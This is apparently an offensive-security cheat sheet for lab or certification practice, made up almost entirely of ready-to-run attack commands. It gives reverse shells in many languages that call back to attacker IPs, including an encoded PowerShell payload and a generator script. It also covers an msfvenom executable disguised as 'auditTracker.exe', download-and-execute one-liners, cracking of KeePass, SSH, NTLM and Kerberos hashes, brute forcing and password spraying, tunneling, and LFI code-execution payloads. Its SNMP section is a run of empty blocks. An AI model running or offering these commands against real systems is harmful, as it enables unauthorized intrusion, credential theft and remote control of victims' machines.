
### Basic info:

```php
whoami
```

```php
id
```

```php
cat /ect/groups
```

### Upgrade Shell:

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### Reverse Shells:

#### Bash

```php
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```php
bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1"
```

#### Perl 

```php
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python 

```php
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

```php
<?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

```php
php -r '$sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Ruby 

```php
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

```php
nc -e /bin/sh 10.0.0.1 1234
```

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.218 1234 >/tmp/f
```

#### Malicious exe payload

```php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=7777 -f exe -o auditTracker.exe
```

#### Listener endpoint

```php
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.45.235; set lport 7777; set ExitOnSession false; exploit -j"
```

#### Powershell

```php
powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.235:1337/Invoke-PowerShellTcp.ps1\")"
```

#### Create powershell one liner

```php
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText

powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

- After the oneline is created we can:
- Generate base64 powershell reverse shell (remember to change IP and PORT)

```php
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

return cmd
```


## Cracking

### KeePass

- First it we extract the password hash

```php
keepass2john Database.kdbx > keepass.hash
```

- Then we crack it. We can either use **john**
```php
john --wordlist=/home/leo/repos/projects/wordlists/passwords/rockyou.txt Keepasshash.txt
```

- or **hashcat**. If we hashcat we must remember to strip off the initial “Database:” from the hash.

```php
hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
```

### ssh key

First we extract the hash

```php
ssh2john id_rsa > ssh.hash
```

- Then we crack it, either with **john** or **hashcat**

```php
john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash.txt
```

```php
hashcat -m 22921 ssh.hash rockyou.txt --force
```

### NTLM

We can use **hashcat** with code 1000

```php
hashcat -m 1000 nelly.hash rockyou.txt -r best64.rule --force
```

### Net-NTLMv2

We can use **hashcat** with code 5600

```php
hashcat -m 5600 paul.hash rockyou.txt --force
```

### AS-REP roasting

- Suppose we perform a AS-REP attack over a windows AD

```php
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

- Then we get the following hash

```php
$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b01ec750cf35a2c37abde02f28b7aa363ffa1d18c9dd0262e43ab6a5447db24f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b147186042faaa686931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22
```

- to crack it we can use hashcat with code `18200`

```php
sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
```

### Kerberoasting

- Suppose we perform a kerberoasting attack over a windows AD

```php
proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
```

- Then we get the following

```php
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...
```

- to crack it we can use hashcat with code `13100`

```php
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
```

## Tunneling

### socat

```php
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

### ssh

Four different types of tunnel:
- **Local port forwarding:** Created with option -L

```php
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@server
```

- **Dynamic port forwarding**: Created with option -D

```php
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

- **Remote port forwarding**: Created with option -R
- First we start a local ssh server
```php
sudo systemctl start ssh
```

- Then we connect back to it from the remote machine. In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).

```php
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

- We can then stop our ssh server: `sudo systemctl stop ssh`

**Remote dynamic port forwarding**: Created with option -R but without specifying endpoints.
- First we start a local ssh server: `sudo systemctl start ssh`
- Then we connect back to it from the remote machine. This creates a SOCKS5 proxy on our local machine at that port which is able to access all interfaces that are available to the victim machine.

```php
ssh -N -R 9998 kali@192.168.118.4
```

- We can then stop our ssh server: `sudo systemctl stop ssh`

### chisel

- First we download the executable on the remote machine

```php
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
```

- then we start the executable on our linux attacker box

```php
./chisel64.elf server -p 8000 --reverse
```

- and then we connect to it from the remote machine using our IP during the connection.

```php
chisel64.exe client 192.168.45.217:8000 R:socks
```

- This, by default, will create a SOCKS5 proxy within the endpoint 127.0.0.1:1080 of our local machine. To access that proxy we can edit the proxychains conf in order to put at the end

```php
socks5 127.0.0.1:1080
```

## Enumeration

### General

Nmap port scanning

```php
nmap -sC -sV <IP>
nmap -p- <IP>
sudo nmap -sU -p161 <IP>
proxychains nmap -sT --top-ports=100 -Pn <IP>
```

Port scanning in windows

```php
Test-NetConnection -Port 445 192.168.50.151
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

Search for exploits and copy them

```php
searchsploit <SOFTWARE>
searchsploit -m 16051
```

DNS zone transfer attack

```php
dig axfr oscp.exam @192.168.221.156
```

Login with RDP

```php
xfreerdp /u:yoshi /p:"Mushroom!" /v:172.16.219.82
```

KeePass database

```php
kpcli --kdb=Database.kdbx
kpcli:/Database/Network> show -f 0
```

Extract data from pdf

```php
exiftool -a file.pdf
```

## Brute Forcing

Brute forcing RDP with hydra

```php
hydra -l user -P rockyou.txt rdp://192.168.50.202
```

Brute forcing FTP with hydra

```php
hydra -l itadmin -I -P rockyou.txt -s 21 ftp://192.168.247.202
```

Brute forcing SSH with hydra

```php
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

Brute forcing HTTP POST login with hydra

```php
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Password spraying RDP with hydra

```php
hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
```

## HTTP

gobuster directory mode

```php
gobuster dir -t20 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.216.121 -x aspx
```

gobuster vhost mode

```php
gobuster vhost --wordlist /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://oscp.exam:8000 --exclude-length 334
```

wfuzz

```php
wfuzz -w /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt http://192.168.238.150:8080/search?FUZZ=FUZZ
```

kiterunner to enumerate API endpoints

```php
kiterunner scan http://192.168.243.143/api/ -w routes-small.kite -x 20
```

php filters with LFI

```php
curl http://192.168.193.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../..//var/www/html/backup.php
```

```php
curl http://192.168.193.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
```

enumerate wordpress sites

```php
# default enumeration
wpscan --url http://10.10.10.88/webservices/wp

# enumerates vulnerable plugins
wpscan --url http://10.10.10.88/webservices/wp --enumerate vp

# enumerates all plugins
wpscan --url http://10.10.10.88/webservices/wp --enumerate ap

# enumerate all plugins using proxy
wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap

# enumerate everything
wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap tt at
```

## SMB

nmap to get basic info

```php
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
```

check for anonymous share

```php
smbmap -H <IP>
```

Connect to SMB share

```php
smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
```

download recursively entire share

```php
smbget -a -R smb://active/Replication
```

list share of particular user with username and password

```php
crackmapexec smb 192.168.242.147 -u web_svc -p Dade --shares
```

list share of particular user with NTLM hash

```php
crackmapexec smb 192.168.242.147 -u web_svc -H 822d2348890853116880101357194052
```

password spraying

```php
crackmapexec smb 192.168.242.147 -u usernames.txt -p Diamond1 --shares
```

crawl all files

```php
crackmapexec smb active -u "" -p "" -M spider_plus
```

## SNMP

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```


```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```


```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```




Find SUID files:

```php
find / -type f -perm -04000 -ls 2>/dev/null
```

